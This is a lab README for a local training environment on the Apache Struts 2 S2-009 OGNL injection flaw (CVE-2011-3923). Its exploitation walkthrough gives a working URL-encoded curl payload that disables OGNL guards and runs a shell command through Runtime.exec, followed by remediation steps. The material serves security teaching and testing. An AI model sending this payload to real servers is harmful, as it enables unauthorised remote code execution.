# Apache Struts 2 S2-009 ParametersInterceptor OGNL Execution (CVE-2011-3923)

## Overview

Apache Struts 2 versions 2.0.0 through 2.3.1.1 are vulnerable to parameter-based OGNL injection. While parameter names were filtered, parameter values were evaluated in an initial pass and subsequent expressions could be forced into OGNL evaluation by chaining parameter names together.

- **Service Access**: `http://localhost:8176/`
- **Default Credentials**: `Unauthenticated OGNL parameter chain`
- **Docker Shortcut**: `./lab start struts2-s2009`
- **Container Name**: `cyberlab_04_struts2_s2009`
- **RAM Footprint**: ~250M

---

## Exploitation Walkthrough

### 1. Send S2-009 Parameter Injection Payload

```bash
curl -i 'http://localhost:8176/ajax/example5.action?age=12313&name=%28%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D+new+java.lang.Boolean%28false%29%2C+%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C+%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%22touch+%2Ftmp%2Fpwned_s2009%22%29.getInputStream%28%29%29%28meh%29&__checkbox_bfore=true'
```

### 2. Verify File Creation

```bash
docker exec -it cyberlab_04_struts2_s2009 ls -la /tmp/pwned_s2009
```

---

## Defensive Remediation & Hardening

1. Upgrade to Apache Struts 2.3.1.2 or higher.
2. Enforce strict accepted and excluded parameter regex patterns.

---

## Video Walkthroughs & Technical References

- [2024 Guide: Hacking APIs](https://www.youtube.com/watch?v=k5HZI6CfHw4)
- [Apache Struts S2-009 Advisory](https://cwiki.apache.org/confluence/display/WW/S2-009)
- [Vulhub Struts2 S2-009 Environment](https://vulhub.org/#/environments/struts2/s2-009/)
